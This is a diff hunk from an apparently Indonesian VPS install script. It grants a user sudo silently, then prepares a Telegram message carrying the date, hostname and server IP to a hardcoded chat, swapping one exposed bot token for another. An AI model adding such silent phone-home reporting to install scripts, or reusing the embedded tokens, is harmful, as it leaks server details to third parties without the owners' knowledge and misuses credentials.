@@ -289,13 +289,13 @@ function password_default() {
     usermod -aG sudo $Username > /dev/null 2>&1
 
     CHATID="-1001899398362"
-    KEY="6614730282:AAFLDAxQEFIoctpy97HnDOPBrzirnilFezI"
+    KEY="6293396608:AAFR9MI4hz8Jfe7AVITf1ANVxOVUhe_lZmc"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     TEXT="
-    ◇━━━━━━━━━━━━━━━━━━━━━━━━◇
+    ◇━━━━━━━━━━━━━━━━━━━━━━━━━◇
      NOTIF INSTALL SCRIPT VPS V3.0
-    ◇━━━━━━━━━━━━━━━━━━━━━━━━◇
+    ◇━━━━━━━━━━━━━━━━━━━━━━━━━◇
     <code>Tanggal    :</code> <code>$tanggal</code>
     <code>Hostname   :</code> <code>${HOSTNAME}</code>
     <code>IP Vps     :</code> <code>$MYIP</code>
